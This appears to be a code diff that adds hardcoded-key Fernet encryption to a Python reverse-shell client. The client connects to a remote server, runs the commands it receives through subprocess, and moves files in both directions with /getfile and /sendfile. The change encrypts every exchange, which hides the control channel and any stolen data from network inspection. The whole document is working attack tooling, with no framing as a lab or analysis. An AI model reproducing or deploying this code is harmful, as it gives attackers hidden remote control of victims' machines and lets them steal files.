@@ -3,6 +3,7 @@ import os
 import subprocess
 import sys
 import argparse
+from cryptography.fernet import Fernet
 
 
 parser = argparse.ArgumentParser(
@@ -20,20 +21,24 @@ SERVER_HOST = args.host
 SERVER_PORT = args.port
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
+key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 cwd = os.getcwd()
-s.send(cwd.encode())
+cwd = Fernet(key).encrypt(cwd.encode())
+s.send(cwd)
 
 while True:
-    command = s.recv(BUFFER_SIZE).decode()
+    command = s.recv(BUFFER_SIZE)
+    command = Fernet(key).decrypt(command).decode()
     splited_command = command.split()
     if command.lower() == "exit":
         break
     if command == "/getfile":
-        filename = s.recv(BUFFER_SIZE).decode()
+        filename = s.recv(BUFFER_SIZE)
+        filename = Fernet(key).decrypt(filename).decode()
         if filename in os.listdir():
             with open(filename, "rb") as f:
                 data = f.read()
@@ -42,7 +47,8 @@ while True:
                 s.send(data)
             f.close()
     if command == "/sendfile":
-        filename = s.recv(1024).decode("utf-8")
+        filename = s.recv(1024)
+        filename = Fernet(key).decrypt(filename).decode("utf-8")
         remaining = int.from_bytes(s.recv(4),'big')
         f = open(filename,"wb")
         while remaining:
@@ -61,5 +67,6 @@ while True:
         output = subprocess.getoutput(command)
     cwd = os.getcwd()
     message = f"{output}{SEPARATOR}{cwd}"
-    s.send(message.encode())
+    message = Fernet(key).encrypt(message.encode())
+    s.send(message)
 s.close()
